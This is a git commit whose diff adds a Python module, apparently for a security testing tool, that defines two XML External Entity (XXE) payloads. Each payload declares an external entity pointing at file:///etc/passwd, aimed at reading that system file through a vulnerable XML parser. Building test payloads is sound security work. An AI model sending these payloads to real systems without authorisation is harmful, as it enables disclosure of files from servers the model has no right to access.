aff69a458465db84490b3bf7678c2dc077a4bbd4
Mrx <143259711+akuajalah01@users.noreply.github.com>
2026-05-13 00:01:19 +0700

    Add XXE payloads for testing

--- core/payloads/xxe_payloads.py
+++ core/payloads/xxe_payloads.py
@@ -1,1 +1,4 @@
-
+XXE_PAYLOADS = [
+    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>''',
+    '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'''
+]
